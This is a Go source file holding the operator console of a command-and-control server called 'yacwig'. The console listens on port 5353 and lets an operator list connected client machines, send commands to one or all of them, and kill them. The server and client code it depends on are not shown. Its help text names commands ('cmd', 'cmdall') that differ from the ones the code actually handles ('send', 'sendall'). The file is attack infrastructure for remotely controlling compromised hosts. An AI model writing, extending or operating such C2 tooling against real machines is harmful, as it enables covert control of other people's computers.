package main

import (
	"fmt"
	"os"
)

func main() {
	// Start the C2 server
	s := Serve(5353)
	clients := &s.clients
	// Command line interface for the C2 server
	for {
		// Get the command
		fmt.Print("yacwig> ")
		var cmd string
		fmt.Scanln(&cmd)
		// Handle the command
		switch cmd {
		case "exit":
			os.Exit(0)
		case "help":
			fmt.Println("exit - Exit the C2 server")
			fmt.Println("help - Show this help")
			fmt.Println("list - List all the clients")
			fmt.Println("cmd - Send a command to a client")
			fmt.Println("cmdall - Send a command to all clients")
		case "list":
			for _, client := range *clients {
				fmt.Println(client.name)
			}
		case "send":
			fmt.Print("send [client]> ")
			var client string
			fmt.Scanln(&client)
			fmt.Print("send [message]> ")
			var message string
			fmt.Scanln(&message)
			// Send the message
			if client == "all" {
				for _, client := range *clients {
					client.Send(message)
				}
			} else {
				(*clients)[client].Send(message)
			}
		case "sendall":
			fmt.Print("sendall [message]> ")
			var message string
			fmt.Scanln(&message)
			// Send the message
			for _, client := range *clients {
				client.Send(message)
			}
		case "kill":
			fmt.Print("kill [client]> ")
			var client string
			fmt.Scanln(&client)
			// Kill the client
			(*clients)[client].Kill()
			delete(*clients, client)
		default:
			fmt.Println("Unknown command")
		}
	}
}
